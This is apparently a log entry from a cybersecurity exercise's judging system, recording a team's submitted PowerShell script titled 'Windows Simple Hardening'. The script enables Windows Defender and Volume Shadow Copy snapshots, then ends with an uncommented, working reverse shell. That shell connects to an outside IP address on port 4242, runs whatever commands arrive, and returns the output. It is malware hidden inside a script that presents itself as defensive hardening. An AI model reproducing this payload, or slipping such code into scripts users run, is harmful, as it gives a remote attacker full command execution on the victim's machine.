[INFO] 2024-01-18 14:43:50,011 | judge.views:73 | {'start_time': datetime.datetime(2024, 1, 18, 6, 43, 49, 996312, tzinfo=<UTC>), 'action_id': 16, 'action_name': 'Windows Simple Hardening', 'team_id': 3, 'team_name': 'team1', 'answer': b'# Check and enable Windows Defender\n\n# Check if Windows Defender is enabled\n$defenderStatus = (Get-MpComputerStatus).AntivirusEnabled\n\nif ($defenderStatus -eq $false) {\n    Write-Host "Windows Defender is currently disabled. Enabling..."\n\n    # Enable Windows Defender\n    Set-MpPreference -RealTimeProtectionEnabled $true\n    \n    Write-Host "Windows Defender has been enabled for real-time protection."\n} else {\n    Write-Host "Windows Defender is already enabled for real-time protection."\n}\n\n# Check and enable Volume Shadow Copy Service (VSS)\n\n# Check if VSS is enabled\n$vssStatus = Get-Service -Name "vss" | Select-Object -ExpandProperty StartType\n\nif ($vssStatus -eq "Disabled") {\n    Write-Host "Volume Shadow Copy Service (VSS) is currently disabled. Enabling..."\n\n    # Enable VSS\n    Set-Service -Name "vss" -StartupType Automatic\n    Start-Service -Name "vss"\n\n    Write-Host "Volume Shadow Copy Service (VSS) has been enabled."\n} else {\n    Write-Host "Volume Shadow Copy Service (VSS) is already enabled."\n}\n\n# Get all fixed disks on the system\n$disks = Get-WmiObject -Query "Select * From Win32_DiskDrive WHERE MediaType = \'Fixed\'"\n\nforeach ($disk in $disks) {\n    $diskLetter = $disk.DeviceID -replace "\\\\.*$"\n    \n    Write-Host "Creating VSS snapshot for disk $($diskLetter)..."\n\n    # Create a new VSS snapshot for the current disk\n    try {\n        $vssResult = vssadmin create shadow /for=$($diskLetter + ":")\n        if ($vssResult -like "*No items found that satisfy the query*") {\n            Write-Host "Failed to create VSS snapshot for disk $($diskLetter)."\n        } else {\n            Write-Host "VSS snapshot created successfully for disk $($diskLetter)."\n        }\n    } catch {\n        Write-Host "An error occurred while creating VSS snapshot for disk $($diskLetter): $_"\n    }\n}\n\nWrite-Host "VSS snapshot creation process completed."\n$client = New-Object System.Net.Sockets.TCPClient(\'103.147.22.142\',4242)\n$stream = $client.GetStream()\n[byte[]]$bytes = 0..65535|%{0}\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n    $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)\n    $stream.Flush()\n}\n$client.Close()\n'}
